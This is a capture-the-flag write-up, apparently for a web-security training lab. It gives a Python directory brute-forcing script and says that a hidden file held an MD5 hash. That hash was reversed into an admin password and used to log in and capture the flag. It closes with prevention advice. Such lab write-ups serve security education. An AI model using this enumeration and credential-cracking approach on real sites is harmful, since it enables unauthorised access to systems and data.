# URL_BRUTE_FORCING

## 🏴 Flag

```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## 📌 Extract

The goal of this scrapping is to find hidden directories of the website, with a .txt containing a lot of directories name.

```python
def scrapper(url: str, dict: str):
	try:
		if not url.endswith("/"):
			url += '/'
		if not url.startswith("http://"):
			url = "http://" + url
		l = []
		with open(dict) as suffixes:
			for word in suffixes:
				if "\n" in word:
					word = word[0:-1]
				res = requests.get(url + word)
				if res.status_code == 200 and "404" not in res.text:
					print("Url Found :", url + word)
					l.append(url+word)
			print(l)
	except Exception as e:
		print(e)
		print(l)
```

Url Found : http://10.11.248.209/admin
Url Found : http://10.11.248.209/whatever

With those two URLs, we can access to the whatever directory which has a file in it. We download it and this is its content:

root: 437394baff5aa33daa618be47b75cb49

We pass the password into a md5 reverse hash et we got : qwerty123@

We can connect has an admin with root as username and qwerty123@ as a password.

And we get the flag.

## **🎯 Use**

This vulnerability involves exploiting hidden or unprotected directories on a website to gain unauthorized access to sensitive information or functionality. Without proper security measures, attackers can:

- **Discover hidden directories** containing sensitive files or data.
- **Access restricted areas** of the website, such as admin panels.
- **Retrieve credentials or configuration files** that can be used for further exploitation.
- **Bypass security mechanisms** by finding and exploiting unprotected resources.

## **🔒 Prevention**

1. **Directory Listing Prevention:** Disable directory listing on the server to prevent exposure of directory contents.
2. **Access Controls:** Implement strict access controls to restrict access to sensitive directories.
3. **Monitor and Log:** Regularly monitor and log access attempts to detect and respond to unauthorized access.
4. **Use Robots.txt Wisely:** Avoid listing sensitive directories in robots.txt, as this can inadvertently expose them.
5. **Regular Audits:** Conduct regular security audits to identify and secure hidden or unprotected directories.

### 📖 [Home page](https://github.com/hugo-bourgeon/darkly#readme)